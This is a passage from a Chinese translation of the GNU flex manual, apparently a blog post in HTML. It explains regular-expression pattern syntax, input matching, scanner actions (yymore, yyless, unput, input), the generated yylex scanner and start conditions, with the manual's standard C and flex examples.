</p><p>  具有范围的字符类;在该case表示匹配a或b，或在j-o之中选择一个匹配，或者匹配一个Z</p></li><li><p><code>[^A-Z]</code>:</p><p>  否定字符类，即除该类之外的任何字符;在该case表示不匹配大写字母</p></li><li><p><code>[^A-Z\n]</code>: </p><p>  不匹配大写字母和回车</p></li><li><p><code>[a-z]{-}[aeiou]</code>: </p><p>  匹配除了元音字母之外的字符</p></li><li><p><code>r*</code>  </p><p>  r是一个正则表达式, 匹配零次或多次</p></li><li><p><code>r+</code> </p><p>  匹配一次或多次。</p></li><li><p><code>r?</code>  </p><p>  匹配零次或一次。</p></li><li><p><code>r{2,5}</code>  </p><p>  {n,m}, m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。</p></li><li><p><code>r{2,}</code> </p><p>  {n,}, n 是一个非负整数。至少匹配n 次。</p></li><li><p><code>r{4}</code> </p><p>  {n}, n 是一个非负整数。匹配确定的 n 次。</p></li><li><p><code>{name}</code>  </p><p>  name定义的扩展，查看<a href="http://westes.github.io/flex/manual/Format.html#Format" target="_blank" rel="noopener">format</a></p></li><li><p>‘“[xyz]&quot;foo”’</p><p>  the literal string: ‘[xyz]”foo’</p></li><li><p>‘\X’  </p><p>  if X is ‘a’, ‘b’, ‘f’, ‘n’, ‘r’, ‘t’, or ‘v’, then the ANSI-C interpretation of ‘\x’. Otherwise, a literal ‘X’ (used to escape operators such as ‘*’)</p></li><li><p><code>\0</code> </p><p>  匹配NULL(ascii code 0)</p></li><li><p><code>\123</code> </p><p>  匹配八进制值为123的字符</p></li><li><p><code>\x2a</code> </p><p>  匹配16进制值为2a的字符</p></li><li><p><code>(r)</code>   </p><p>  match <code>r</code>；括号用于提高优先级</p></li><li><p><code>(?r-s:pattern)</code><br>  :之后的是使用的pattern，而使用r并略去s对pattern进行解释<br>  r和s这两个参数可以为空或者<code>i</code> <code>s</code> <code>x</code><br>  i表示大小写不敏感 -i表示大小写不敏感<br>  s表示通过<code>.</code>匹配单字节的任意字符, -s表示<code>.</code>匹配\n之外的任何字节(译者注:其实就是用s来指明<code>.</code>的意思)<br>  x会忽略注释和空白符，除非空格被反斜杠转义，或者包含在””中或者出现在前面所说的字符类里，否则将被忽略<br>  以下表达式都是合法的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">(?:foo)         same as  (foo)</span><br><span class="line">(?i:ab7)        same as  ([aA][bB]7)</span><br><span class="line">(?-i:ab)        same as  (ab)</span><br><span class="line">(?s:.)          same as  [\x00-\xFF]</span><br><span class="line">(?-s:.)         same as  [^\n]</span><br><span class="line">(?ix-s: a . b)  same as  ([Aa][^\n][bB])</span><br><span class="line">(?x:a  b)       same as  (&quot;ab&quot;)</span><br><span class="line">(?x:a\ b)       same as  (&quot;a b&quot;)</span><br><span class="line">(?x:a&quot; &quot;b)      same as  (&quot;a b&quot;)</span><br><span class="line">(?x:a[ ]b)      same as  (&quot;a b&quot;)</span><br><span class="line">(?x:a</span><br><span class="line">    &#x2F;* comment *&#x2F;</span><br><span class="line">    b</span><br><span class="line">    c)          same as  (abc)</span><br></pre></td></tr></table></figure></li><li><p><code>(?# comment )</code>  </p><p>  忽略任何在()里的字符</p></li><li><p><code>rs</code>  </p><p>  将r和s两个正则表达式相串联 (不是很懂)</p></li><li><p><code>r|s</code> </p><p>  用r或s去匹配,并联的意思。</p></li><li><p><code>r/s</code><br>  匹配r，但是r之后必须有s，确定此规则为最长匹配项时包括s，但是在返回文本时只返回r。</p></li><li><p><code>^r</code><br>  只在一行的开头去匹配r(即，刚开始扫描时或在扫描到换行符之后)</p></li><li><p><code>r$</code><br>  在一行的结尾去匹配r</p></li><li><p><code>&lt;s&gt;r</code><br>  在start condition为s的时候才用r匹配;</p></li><li><p><code>&lt;s1,s2,s3&gt;r</code></p><p>  start condition为s1或s2或s3时才用r匹配;</p></li><li><p><code>&lt;*&gt;r</code>    </p><p>  在任何start condition都可以用r匹配</p></li><li><p><code>&lt;&lt;EOF&gt;&gt;</code> </p><p>  匹配EOF(文件结束)</p></li><li><p><code>&lt;s1,s2&gt;&lt;&lt;EOF&gt;&gt;</code></p><p>  在start condition为s1和s2的时候,匹配EOF</p></li></ul><p>注意一下在字符集合里，所有的正则表达式的operator丢失了他们的特殊意义，除了’\‘   ‘-‘   ‘]]’和在集合前面的’^’</p><p>上面所有提到的正则表达式都被根据优先级从最高到最低来组织，那些被分组到一起的是具有相同优先级的(在–posix 遵从POSIX标准的参数的文档中关于repeat operator ‘{}’优先级的特殊标记) 例如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foo|bar*</span><br></pre></td></tr></table></figure><p>等价于</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(foo)|(ba(r*))</span><br></pre></td></tr></table></figure><p>因为<code>*</code>操作符比串联有更高的优先级，串联比并联(<code>|</code>)更高的优先级。</p><p>因此这个pattern匹配的是字符串”foo”或者”ba”后面跟着0或多个满足r的字符串</p><p>为了匹配’foo’或者0或多个”bar” 可以这么写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foo|(bar)*</span><br></pre></td></tr></table></figure><p>或者为了匹配0个或多个”foo或bar”，可以写成这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(foo|bar)*</span><br></pre></td></tr></table></figure><ul><li><p><code>{-}</code>这个是求差集的operator，他会计算两个character class的差集</p><p>  例如<code>[a-c]{-}[b-z]</code> 会匹配在a-c里不在b-z里的字符</p></li><li><p><code>{+}</code>是求并集的operator，他会计算两个character class的并集</p><p>  例如在“C”的运行环境中<code>[[:alpha:]]{-}[[:lower:]]{+}[q]</code>这个和<code>[A-Zq]</code>是等价的</p></li><li><p>一条规则最多可以包含一个尾随上下文实例(“/”运算符或“$”运算符)。起始条件“^”和“&lt;<EOF>&gt;”模式只能出现在模式的开头，并且不能与“/”和“$”一起放在括号内。规则开头没有出现的“^”或规则结尾没有出现的“$”将失去其特殊属性，并被视为普通字符。</p></li></ul><ul><li><p>以下表达式是不合法的:<br>  第一句可以被写成这样<code>foo/bar\n</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">foo&#x2F;bar$</span><br><span class="line"> &lt;sc1&gt;foo&lt;sc2&gt;bar</span><br></pre></td></tr></table></figure></li><li><p>以下情况$或者^会被忽略，当作一个普通字符</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">foo|(bar$)</span><br><span class="line"> foo|^bar</span><br></pre></td></tr></table></figure><p>如果你希望匹配的是’foo’或者’bar’后接一个新行，可以这么写，一个小trick将work。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">foo      |</span><br><span class="line"> bar$     &#x2F;* action goes here *&#x2F;</span><br></pre></td></tr></table></figure><h2 id="7-How-the-Input-Is-Matched"><a href="#7-How-the-Input-Is-Matched" class="headerlink" title="7 How the Input Is Matched"></a>7 How the Input Is Matched</h2><p>生成的扫描程序(scanner)运行的时候，它会分析输入来寻找与模式(pattern)匹配的字符串。如果找到多个匹配字符串，它会匹配文本最多的那一个(for trailing context rules，包括trailing部分的长度)。如果找到多个长度相同的匹配字符串，则按照flex输入文件中最先列出的规则选择。</p><p>一旦确定匹配，就在全局字符指针yytext中提供与该匹配相对应的文本(称为token)，并在全局int变量yyleng中提供长度。然后执行与匹配模式(pattern)相对应的操作(action)，然后扫描剩余的输入寻找下一个匹配。</p><p>如果找不到匹配，则执行默认规则：下一个输入的字符将被视为匹配并复制到标准输出中。因此，最简单的有效flex输入是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%%</span><br></pre></td></tr></table></figure><p>其生成一个扫描程序(scanner)将输入(一次一个字符)简单地复制到输出。</p><p>注意yytext可以用两种方式定义：作为字符指针或者字符数组。你可以通过在你的flex输入的开头(定义)部分包含<code>%pointer</code> 或<code>%array</code>中的一个来控制flex使用哪一个定义。</p><p>默认是<code>%pointer</code>，除非使用<code>&#39;-l&#39;</code>lex兼容性选项，在这种情况下yytext就是一个数组。使用<code>％pointer</code>的好处是在匹配非常大的token时(除非您用尽了动态内存)，扫描速度明显加快，并且没有缓冲区溢出，缺点是在修改yytext方面，你的action将受到限制(参考<a href="http://westes.github.io/flex/manual/Actions.html#Actions" target="_blank" rel="noopener">action</a>)，而且对<code>unput()</code>函数的调用会破坏yytext的当前内容，这在不同lex版本之间移动的时候可能会有很大的麻烦。</p><p>使用<code>%array</code>的好处在于你可以修改yytext为你想要的内容，而且调用<code>unput()</code>不会破坏yytext。此外，现有的lex程序有时会使用以下形式的声明从外部访问yytext：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extern char yytext[];</span><br></pre></td></tr></table></figure><p>这个声明在使用<code>%pointer</code>时是错误的，但在使用<code>%array</code>时是正确的。</p><p><code>％array</code>声明将yytext定义为YYLMAX个字符的数组，YYLMAX默认为相当大的值，你可以在flex输入的第一部分中简单的#define YYLMAX为另一个值来更改它的大小。如上所述，使用<code>%pointer</code>时yytext会动态地增长来容纳很大的token。即你的<code>%pointer</code>扫描程序(scanner)可以容纳非常大的token(例如匹配整个注释块)，但请记住每次扫描器必须重新调整yytext的大小时，还必须从头开始重新扫描整个token，因此匹配这种token可能会很慢。<br>如果调用unput()导致太多文本被push back，则yytext目前不会动态增长，而是会导致运行时错误。</p><p>另外注意，不能将<code>％array</code>与C++扫描程序(scanner)类一起使用(参考<a href="http://westes.github.io/flex/manual/Cxx.html#Cxx" target="_blank" rel="noopener">Cxx</a>)。</p><h2 id="8-Actions"><a href="#8-Actions" class="headerlink" title="8 Actions"></a>8 Actions</h2><p>规则中的每个pattern都有一个相应的action, 这些action可以是任意的c语言.</p><p>Pattern以第一个非转义的空字符结束; 这一行剩下的部分就是它的action.</p><p>如果这个action是空的,那么当pattern进行匹配时, 它的input token就会被简单的丢弃.</p><p>例如, 下面是一个程序的rule, 它从输入中删除了所有出现的”zap me”:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%%</span><br><span class="line">&quot;zap me&quot;</span><br></pre></td></tr></table></figure><p>这个示例将输入中的所有其他字符复制到输出中, 因为这些其他字符将由默认规则匹配.</p><p>下面是一个程序, 它将多个空格和制表符(tabs)压缩到单个的空白(blank), 并丢弃行尾的空格:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%%</span><br><span class="line">[ \t]+        putchar( &#39; &#39; );</span><br><span class="line">[ \t]+$       &#x2F;* ignore this token *&#x2F;</span><br></pre></td></tr></table></figure><p>如果这个action包含<code>&quot;{&quot;</code>, 那么该action将一直持续到找到<code>&quot;}&quot;</code>, 并且这个操作可能会跨越几行. </p><p>flex明白C的strings和注释, 所以flex不会因为字符串和注释里面的大括号而上当. 并且flex允许action以<code>&#39;%{&#39;</code>开头的操作,并将该action视为<code>&quot;%}&quot;</code>之前的所有文本(而不管action中出现的普通大括号).</p><p>一个仅包括竖线<code>&quot;|&quot;</code>的action表示与下一个action的规则(rule)相同。可见于下面的例证.</p><p>Actions可以包括任意的C代码,包括<code>return</code>语句–将一个值返回给任何调用<code>yylex()</code>的程序.每次调用<code>yylex()</code>,它将从上次中断的地方继续处理token,直到文件的末尾或者执行返回.</p><p>Actions可以自由地修改<code>yytext</code>,除了延长它的长度(向其末尾增加字符––这样会覆盖输入流中后面的字符). 但是,使用<code>%array</code>的情况不适用于此(请参考Matching).在这种情况下,可以任意修改<code>yytext</code>.</p><p>Actions可以自由地修改<code>yyleng</code>,但是如果action还包括<code>yymore()</code>的使用,则不应该修改<code>yyleng</code>(见下文).</p><p>这里有许多特殊的指令(directives),这些指令可以被用于action中:</p><ul><li><p>ECHO<br>   拷贝yytext到scanner的输出</p></li><li><p>BEGIN<br>   紧随其后的是开始条件的名称,将scanner置于相应的开始条件中(见下文)</p></li><li><p>yymore()<br>   告诉scanner,下次它匹配规则时,应该将对应的token加到<code>yytext</code>的当前值上,不是替换它.例如,给定输入为<code>&#39;mega-kludge&#39;</code>,下面的输出将写入<code>mega-mega-kludge’</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%%</span><br><span class="line">mega-    ECHO; yymore();</span><br><span class="line">kludge   ECHO;</span><br></pre></td></tr></table></figure><p>这是关于<code>yymore()</code>的两个说明.<br>首先,<code>yymore()</code>取决于<code>yyleng</code>的值,它正确的反应了当前token的大小,所以如果使用<code>yymore()</code>则不能修改<code>yyleng</code>.<br>其次,scanner的action中存在<code>yymore()</code>会对scanner的匹配速度造成轻微的性能损失.</p></li><li><p>yyless(n)<br>   除了当前token的前n个字符,将剩下的字符返回到输入流,当scanner查找下一个匹配时,这些字符将被重新查找.对于<code>yytext</code>和<code>yyleng</code>做了一些适当地调整(例如,<code>yyleng</code>现在等于n).例如,在输入<code>&#39;foobar&#39;</code>,下面将输出<code>&#39;foobarbar&#39;</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%%</span><br><span class="line">foobar    ECHO; yyless(3);</span><br><span class="line">[a-z]+    ECHO;</span><br></pre></td></tr></table></figure><p>将0作为参数传入<code>yyless()</code>将导致再次扫描当前输入的字符串.除非您已经改变了scanner处理输入的方式(例如使用了<code>BEGIN</code>),否则这将导致一个死循环.<br>注意,<code>yyless()</code>是一个宏,只能在flex输入文件中使用,而不能从其他源文件中使用.</p></li><li><p>unput(c)<br>   将字符<code>c</code>放回输入流.这将是下一个字符扫描.下面的action将使用当前的token,进行重新扫描,并用括号闭合。</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">int i;</span><br><span class="line">&#x2F;* Copy yytext because unput() trashes yytext *&#x2F;</span><br><span class="line">char *yycopy &#x3D; strdup( yytext );</span><br><span class="line">unput( &#39;)&#39; );</span><br><span class="line">for ( i &#x3D; yyleng - 1; i &gt;&#x3D; 0; --i )</span><br><span class="line">    unput( yycopy[i] );</span><br><span class="line">unput( &#39;(&#39; );</span><br><span class="line">free( yycopy );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意,由于每个<code>unput()</code>都将给定的字符放回输入流的开头,所以必须由后向前插入字符串.</p><p>使用<code>unput</code>时的一个重要的潜在问题是,如果使用<code>%pointer</code>(默认),调用<code>unput()</code>会破坏<code>yytext</code>的内容,从其最右边的字符开始，并在每次调用时向左吞噬一个字符。如果你需要在调用<code>unput()</code>后保留<code>yytext</code>的值(如上面的示例所示),则必须先将它复制到其他地方,或者使用<code>%array</code>构建scanner(参见<a href="http://westes.github.io/flex/manual/Matching.html#Matching" target="_blank" rel="noopener">Matching</a>).</p><p>最后,请注意,不能将<code>&#39;EOF&#39;</code>插入(push back)来尝试用文件结束来标记输入流.</p><ul><li>input()<br>   从输入流读取下一个字符.例如,以下是清除C注释的一种方法:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">%%</span><br><span class="line">  &quot;&#x2F;*&quot;        &#123;</span><br><span class="line">              int c;</span><br><span class="line"></span><br><span class="line">              for ( ; ; )</span><br><span class="line">                  &#123;</span><br><span class="line">                  while ( (c &#x3D; input()) !&#x3D; &#39;*&#39; &amp;&amp;</span><br><span class="line">                          c !&#x3D; EOF )</span><br><span class="line">                      ;    &#x2F;* eat up text of comment *&#x2F;</span><br><span class="line"></span><br><span class="line">                  if ( c &#x3D;&#x3D; &#39;*&#39; )</span><br><span class="line">                      &#123;</span><br><span class="line">                      while ( (c &#x3D; input()) &#x3D;&#x3D; &#39;*&#39; )</span><br><span class="line">                          ;</span><br><span class="line">                      if ( c &#x3D;&#x3D; &#39;&#x2F;&#39; )</span><br><span class="line">                          break;    &#x2F;* found the end *&#x2F;</span><br><span class="line">                      &#125;</span><br><span class="line"></span><br><span class="line">                  if ( c &#x3D;&#x3D; EOF )</span><br><span class="line">                      &#123;</span><br><span class="line">                      error( &quot;EOF in comment&quot; );</span><br><span class="line">                      break;</span><br><span class="line">                      &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br></pre></td></tr></table></figure></li></ul><p>(请注意,如果scanner是使用c++编译的,那么<code>input()</code>将被替换为<code>yyinput()</code>,以避免产生与c++流名字冲突的情况.</p><ul><li><p>YY_FLUSH_BUFFER<br>   刷新scanner的内部缓冲区,以便下次scanner尝试匹配token,它将首先使用<code>YY_INPUT()</code>填充缓冲区(参见<a href="http://westes.github.io/flex/manual/Generated-Scanner.html#Generated-Scanner" target="_blank" rel="noopener">Generated Scanner</a>.这个action是比<code>yy_flush_buffer</code>函数更通用的特例.如下所述(参见 <a href="http://westes.github.io/flex/manual/Multiple-Input-Buffers.html#Multiple-Input-Buffers" target="_blank" rel="noopener">Multiple Input Buffers</a>)</p></li><li><p>yyterminate()<br>   可以用来代替action中的返回语句.它终止scanner并将0返回给scanner的调用者,指示”全部完成”.默认情况下,当遇到文件结束,也会调用<code>yyterminate()</code>.它是一个宏,可以重新定义.</p></li></ul><h2 id="9-The-Generated-Scanner"><a href="#9-The-Generated-Scanner" class="headerlink" title="9 The Generated Scanner"></a>9 The Generated Scanner</h2><p>flex的输出是lex.yy.c,包括扫描程序(scanning routine) yylex(),许多用于匹配token的表，一些辅助函数和宏定义。<br>默认yylex()函数被声明如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int yylex()</span><br><span class="line">    &#123;</span><br><span class="line">    ... various definitions and the actions in here ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>但是我们可以通过一个宏定义来改变它。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define YY_DECL float lexscan( a, b ) float a, b;</span><br></pre></td></tr></table></figure><p>这代表另scanning routine名为lexscan，并包括两个float类型的参数和返回一个float类型的变量。<br>此外flex创建的程序遵循c99标准。<br>每次yylex调用，都会从全局输入yyin(默认为stdin)中顺序扫描token，直到到达文件末尾(此时返回0)，或者遇到一个执行”return”语句的action。<br>如果scanner到达文件末尾，则后续调用是不确定的。<br>既可以将yyin指向新的输入文件(在这种情况下，扫描将从该文件继续进行)，也可以调用yyrestart()函数。<br>yyrestart()接受一个参数，一个FILE *指针(这个指针可能是NULL，如果你已经设置了YY_INPUT宏从其他地方读取，而不是从yyin)，然后它将初始化yyin，用于从这个文件(FILE *)继续扫描。<br>这两种方法之间基本上没有区别。<br>后者可以兼容早期版本的flex，因为它可以用于在扫描的过程中就切换输入文件；通过将yyin传递给yyrestart，调用这个函数，也可以用来丢弃当前的input buffer，但是最好还是使用YY_FLUSH_BUFFER。<br>请注意，yyrestart()不会将开始条件重置为INITIAL<br>如果yylex()由于在某个action上执行了return而停止扫描，则可以再次调用scanner，并且它将从中断处继续扫描。<br>默认情况下(为了提高效率)，scanner使用块读取而不是简单的getc()调用来读取字符y，可以通过定义YY_INPUT宏来控制如何获取输入。<br>YY_INPUT() is YY_INPUT(buf,result,max_size)，它用于在buf数组里放置最多max_size个字节，并且在整数变量result中，记录读取的字节数量或者YY_NULL(在Unix系统上值为0)，YY_NULL是为了表示遇到EOF。<br>YY_INPUT默认从yyin中读取。<br>下面是一个简单的例子，在输入文件的define部分的示例定义。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line">#define YY_INPUT(buf,result,max_size) \</span><br><span class="line">    &#123; \</span><br><span class="line">    int c &#x3D; getchar(); \</span><br><span class="line">    result &#x3D; (c &#x3D;&#x3D; EOF) ? YY_NULL : (buf[0] &#x3D; c, 1); \</span><br><span class="line">    &#125;</span><br><span class="line">%&#125;</span><br></pre></td></tr></table></figure><p>此定义会将输入处理更改为一次读取一个字符。<br>当scanner从YY_INPUT接收到EOF时，它将使用yywrap()函数进行检查。如果yywrap()返回false(零)，则假定该函数已进行设置y指向另一个输入文件，然后继续扫描。<br>如果返回true(非零)，则scanner终止，并向其调用方返回0。<br>请注意，无论哪种情况，start condition均保持不变；它并没有恢复 INITIAL。<br>如果您没有提供自己的版本yywrap()，则必须使用%option noyywrap(在这种情况下，scanner的行为就像yywrap()返回1)，或者您必须链接“-lfl’来获取默认的yywrap版本，该版本始终返回1。<br>关于从内存缓冲区扫描(例如 scanning string)，在Scanning Strings和Multiple Input Buffers部分。<br>scanner将写入它的ECHO输出到yyout global(默认为stdout)，用户只需将其分配给其他FILE指针即可重新定义。</p><h2 id="10-Start-Conditions"><a href="#10-Start-Conditions" class="headerlink" title="10 Start Conditions"></a>10 Start Conditions</h2><p>flex提供了有条件的激活规则机制，任何以<code>&lt;sc&gt;</code>前缀的pattern，仅在scanner处于名为sc的开始状态时，才处于活动状态。<br>例如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;STRING&gt;[^&quot;]*        &#123; &#x2F;* eat up the string body ... *&#x2F;</span><br><span class="line">            ...</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>这个pattern将被激活，仅当scanner处于STRING状态。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;INITIAL,STRING,QUOTE&gt;\.        &#123; &#x2F;* handle an escape ... *&#x2F;</span><br><span class="line">            ...</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>这个pattern将被激活，仅当scanner处于INITIAL,STRING或QUOTE状态</p><p>可以使用%s和%x来定义两种特殊的start condition。<br>一个开始条件被激活，通过BEGIN action。在执行下一个BEGIN action之前，具有给定开始条件的规则将处于活动状态，而具有其他开始条件的规则将处于非活动状态</p><p>包容性(inclusive)的启动条件<br>如果启动条件是inclusive的，则完全没有给出sc限定的规则也将处于活动状态。</p><p>排他性(exclusive)的启动条件<br>如果是排他性的，则只有符合开始条件的规则才是活动的。<br>一组基于相同排他开始条件的规则描述了一个扫描程序，该扫描程序独立于以下任何其他来自flex input的规则。<br>因此，排它的启动条件使指定”mini-scanners”变得容易，该”mini-scanners”将扫描输入中与其余语法(例如，注释)不同的部分。</p><p>如果上述描述有点模糊，考虑以下例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%s example</span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line">&lt;example&gt;foo   do_something();</span><br><span class="line"></span><br><span class="line">bar            something_else();</span><br></pre></td></tr></table></figure><p>等价于</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%x example</span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line">&lt;example&gt;foo   do_something();</span><br><span class="line"></span><br><span class="line">&lt;INITIAL,example&gt;bar    something_else();</span><br></pre></td></tr></table></figure><p>如果没有<code>&lt;INITIAL,example&gt;</code>限定符，则bar第二个示例中的pattern在启动条件处于example时，将不会处于活动状态(即无法匹配)。<br>但是，如果我们仅用<code>&lt;example&gt;</code>限定条件bar，那么它将仅在处于example时被激活而不在处于INITIAL时被激活。<br>而在第一个示例中它同时在两个中都起作用。<br>(译者注：排他是在已经进入了某个sc时的排他，包容也是在某个sc里的包容)</p><p>还要注意，特殊的启动条件说明符<code>&lt;*&gt;</code>匹配每个启动条件。因此，上面的示例也可以写成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">％x example</span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line">&lt;example&gt; foo do_something();</span><br><span class="line"></span><br><span class="line">&lt;*&gt; bar something_else();</span><br></pre></td></tr></table></figure><p>The default rule (to ECHO any unmatched character) remains active in start conditions. It is equivalent to:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;*&gt;.|\n     ECHO;</span><br></pre></td></tr></table></figure><p>BEGIN(0)返回到没有开始条件被激活的初始状态。<br>此状态也可以称为INITIAL，因此BEGIN(INITIAL)等效于BEGIN(0)。(在开始条件名称周围的括号不是必需的，但是被认为是很好的样式)</p><p>BEGIN动作也可以在规则部分的开头以缩进代码的形式给出。例如，以下内容将导致scanner进入SPECIAL开始状态，当每次yylex()被调用且全局变量enter_special为true。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">        int enter_special;</span><br><span class="line"></span><br><span class="line">%x SPECIAL</span><br><span class="line">%%</span><br><span class="line">        if ( enter_special )</span><br><span class="line">            BEGIN(SPECIAL);</span><br><span class="line"></span><br><span class="line">&lt;SPECIAL&gt;blahblahblah</span><br><span class="line">...more rules follow...</span><br></pre></td></tr></table></figure><p>为了说明开始条件的用法，下面是一个scanner，它提供了两种不同的字符串解释，例如’123.456’。<br>默认情况下，它将视为三个token，即整数’123’，点(‘.’)和整数’456’。<br>但是，如果该行字符串的前缀是’expect-floats’,它会将其视为单个令牌，即浮点数’123.456’：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line">    #include &lt;math.h&gt;</span><br><span class="line">    %&#125;</span><br><span class="line">    %s expect</span><br><span class="line"></span><br><span class="line">    %%</span><br><span class="line">    expect-floats        BEGIN(expect);</span><br><span class="line"></span><br><span class="line">    &lt;expect&gt;[0-9]+.[0-9]+      &#123;</span><br><span class="line">                printf( &quot;found a float, &#x3D; %f\n&quot;,</span><br><span class="line">                        atof( yytext ) );</span><br><span class="line">                &#125;</span><br><span class="line">    &lt;expect&gt;\n           &#123;</span><br><span class="line">                &#x2F;* that&#39;s the end of the line, so</span><br><span class="line">                 * we need another &quot;expect-number&quot;</span><br><span class="line">                 * before we&#39;ll recognize any more</span><br><span class="line">                 * numbers</span><br><span class="line">                 *&#x2F;</span><br><span class="line">                BEGIN(INITIAL);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">    [0-9]+      &#123;</span><br><span class="line">                printf( &quot;found an integer, &#x3D; %d\n&quot;,</span><br><span class="line">                        atoi( yytext ) );</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">    &quot;.&quot;         printf( &quot;found a dot\n&quot; );</span><br></pre></td></tr></table></figure><p>下面是一个scanner，其可以在保持当前输入行计数的同时，识别并丢弃掉注释。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 